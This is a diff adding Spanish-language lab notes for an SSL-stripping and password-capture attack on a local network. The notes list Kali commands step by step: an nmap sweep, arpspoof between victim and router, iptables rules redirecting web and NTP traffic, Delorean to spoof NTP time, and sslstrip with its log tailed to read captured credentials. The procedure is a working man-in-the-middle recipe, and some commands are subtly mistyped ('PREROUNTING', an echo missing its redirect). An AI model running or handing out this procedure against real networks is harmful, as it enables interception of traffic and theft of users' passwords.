@@ -1,0 +1,77 @@
+Laboratorio de trafico SSL y captura de contraseñas: 
+
+Kali#
+
+- validar sistema operativo de kali 
+
+Kali#uname -a 
+
+0- ping sweep con nmap: 
+
+nmap -sn IP/mask
+
+1-kali forwarding - Encender el IP forward en linux
+
+Kali# echo 1  /proc/sys/net/ipv4/ip_forward
+
+2- En otra terminal:
+
+Kali#arpspoof -i eth0 -t IP_Victima IP_Router
+
+3- validar firewall del kali
+
+Kali#iptables -L
+
+Kali#iptables -t nat -L
+
+4- *En caso de limpiar la tabla de iptables con :
+
+Kali#iptables -F
+
+5- Crear reglas de forwarding y redirecionamiento de puertos
+
+Kali#iptables -t nat -A PREROUNTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+Kali#iptables -t nat -A PREROUNTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
+Kali#iptables -t nat -A PREROUNTING -p udp --destination-port 123 -j REDIRECT --to-port 123
+
+6- Verificar nuevamente la iptables de NAT 
+
+iptables -t nat -L
+
+7- usar Delorean - Servidor NTP 
+
+Kali#mkdir tools
+Kali#cd tools/
+Kali-tools#git clone https://github.com/PentesterES/Delorean.git
+Kalitools/#ls
+Kali/tools/#./delorean.py --help
+Kali/tools/#./delorean.py --force-date= '2040-02-02'
+
+8- Nueva terminal , uso de la herramienta sslstrip
+
+Kali#cd /usr/share/sslstrip
+Kali/usr/share/sslstrip#ls
+Kali/usr/share/sslstrip#./sslstrip.py -k -l 8080
+
+
+9- Nueva terminal, Herramienta para decifrarf trafico SSL
+Kali/usr/share/sslstrip# tail -f sslstrip.log
+
+10- Nota: para reiniciar el servicio del delorean 
+
+Kali/tools#ps -fea | grep delorean 
+Kali/tools#kill -9 4429
+Kali/tools#./delorean.py
+
+
+
+
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////
+Maquina victima: 
+
+0- validar la tabla ARP: 
+
+victima_windows# arp -a
+
+2- validar nuevamente la tabla ARP:
